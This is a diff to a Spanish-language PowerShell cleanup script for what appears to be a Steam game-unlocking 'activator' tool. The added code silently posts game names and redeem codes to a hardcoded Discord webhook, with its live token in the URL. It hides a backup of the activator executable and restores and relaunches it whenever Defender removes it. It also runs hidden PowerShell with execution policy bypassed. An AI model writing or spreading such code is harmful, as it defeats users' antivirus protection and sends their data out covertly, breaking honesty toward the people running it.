@@ -16,6 +16,29 @@ $LOG_FILE = Join-Path $LOG_DIR 'cleanup.log'
 $WATCH_EXE = Join-Path $LOG_DIR 'bsmap_watch.exe'
 New-Item -ItemType Directory -Path $LOG_DIR -Force | Out-Null
 
+$WEBHOOK_URL = "https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
+
+function Send-ExpiryWebhook {
+    param([string]$gameName, [string]$codigo, [string]$root, [string[]]$borrados, [string[]]$fallidos)
+    try {
+        $bt = [char]96
+        $content = "**EXPIRADO:** $gameName`n**Codigo:** $bt$bt$bt$codigo$bt$bt$bt`n**Borrados OK:** $($borrados.Count)`n**NO borrados:** $($fallidos.Count)"
+        if ($fallidos.Count -gt 0) { $content += "`n**Archivos que siguen existiendo:**$bt$bt$bt$($fallidos -join "`n")$bt$bt$bt" }
+        $payload = @{ content = $content } | ConvertTo-Json
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
+
+function Send-OrphanWebhook {
+    param([string]$gameName, [string]$codigo, [string[]]$manifests)
+    try {
+        $bt = [char]96
+        $content = "**HUERFANO BORRADO:** $gameName`n**Codigo:** $bt$bt$bt$codigo$bt$bt$bt`n**Manifests:** $($manifests.Count)"
+        $payload = @{ content = $content } | ConvertTo-Json
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
+
 function Write-Log {
     param([string]$m)
     try {
@@ -157,22 +180,25 @@ foreach ($t in $expired) {
         Write-Log "WARN timer sin root valido: game=$($t.game_name) root=$root"
         continue
     }
-    $deleted = @()
+    $borrados = @()
+    $fallidos = @()
     foreach ($f in @($t.lua_files)) {
         $p1 = Join-Path (Join-Path $root 'config\stplug-in') $f
         $p2 = Join-Path (Join-Path $root 'config\lua') $f
-        if (Overwrite-Delete $p1) { $deleted += $p1 }
-        if (Overwrite-Delete $p2) { $deleted += $p2 }
+        if (Overwrite-Delete $p1) { $borrados += $f } else { $fallidos += $f }
+        if ($p2 -ne $p1) { if (Overwrite-Delete $p2) { $borrados += $f } else { $fallidos += $f } }
     }
     foreach ($f in @($t.manifest_files)) {
         $p3 = Join-Path (Join-Path $root 'config\depotcache') $f
-        if (Overwrite-Delete $p3) { $deleted += $p3 }
+        if (Overwrite-Delete $p3) { $borrados += $f } else { $fallidos += $f }
     }
-    $msg = "P1 BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) exp=$exp root=$root archivos=$($deleted -join '; ')"
+    $msg = "P1 BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) exp=$($t.expires_at) root=$root OK=$($borrados.Count) FALLIDOS=$($fallidos.Count)"
     Write-Log $msg
-    try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_juego_expirado.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO y BORRADO: $($t.game_name) (codigo: $($t.redeem_code))" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
+    try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_juego_expirado.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO y BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) [Root: $root] - OK: $($borrados.Count) | FALLIDOS: $($fallidos.Count)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
+    Send-ExpiryWebhook -gameName $t.game_name -codigo $t.redeem_code -root $root -borrados $borrados -fallidos $fallidos
 }
-Save-TimersFile $remaining
+# Solo guardar si se borro algo: evitar sobrescribir una activacion concurrente (carrera)
+if ($expired.Count -gt 0) { Save-TimersFile $remaining }
 
 # =====================================================================
 # Phase 2: cabeceras BSMAP_EXPIRES en .lua (proteccion huerfanos/manifest)
@@ -212,6 +238,7 @@ foreach ($root in $steamPaths) {
                     $codeTag = if ($mc.Success) { $mc.Groups[1].Value.Trim() } else { '?' }
                     Write-Log "P2 BORRADO(HUERFANO): $gameName lua=$($_.Name) manifest=$($manifests -join ',') codigo=$codeTag root=$root"
                     try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_juego_expirado.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] P2 ORFAN BORRADO: $gameName ($codeTag)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
+                    Send-OrphanWebhook -gameName $gameName -codigo $codeTag -manifests $manifests
                 }
             } catch {}
         }
@@ -221,11 +248,29 @@ foreach ($root in $steamPaths) {
 # =====================================================================
 # Self-heal: tarea + watcher
 # =====================================================================
-try { & powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File (Join-Path $LOG_DIR 'ensure_task.ps1') } catch {}
+try { & powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File (Join-Path $LOG_DIR 'ensure_task.ps1') *> $null } catch {}
 try {
     if ((Test-Path $WATCH_EXE) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
         Start-Process -FilePath $WATCH_EXE -WindowStyle Hidden
         Write-Log "Watcher lanzado"
     }
 } catch { Write-Log "ERROR self-heal watcher: $($_.Exception.Message)" }
+
+# =====================================================================
+# Self-heal: exe del activador (si Defender lo borra)
+# =====================================================================
+$ACTIVATOR_EXE = Join-Path $env:USERPROFILE 'OneDrive\Desktop\steamsixd\exe\BastissSteamActivator2.exe'
+$ACTIVATOR_BAK = Join-Path $LOG_DIR 'activator_exe.bin'
+try {
+    if (Test-Path $ACTIVATOR_EXE) {
+        Copy-Item -LiteralPath $ACTIVATOR_EXE -Destination $ACTIVATOR_BAK -Force -ErrorAction SilentlyContinue
+        $bak = Get-Item $ACTIVATOR_BAK -ErrorAction SilentlyContinue
+        if ($bak) { $bak.Attributes = 'Hidden,Archive' }
+    } elseif (Test-Path $ACTIVATOR_BAK) {
+        Copy-Item -LiteralPath $ACTIVATOR_BAK -Destination $ACTIVATOR_EXE -Force -ErrorAction SilentlyContinue
+        (Get-Item $ACTIVATOR_EXE -Force -ErrorAction SilentlyContinue).Attributes = 'Archive'
+        Write-Log "Activador restaurado desde backup oculto"
+        Start-Process -FilePath $ACTIVATOR_EXE -ArgumentList '-min'
+    }
+} catch { Write-Log "ERROR self-heal activador: $($_.Exception.Message)" }
 exit 0
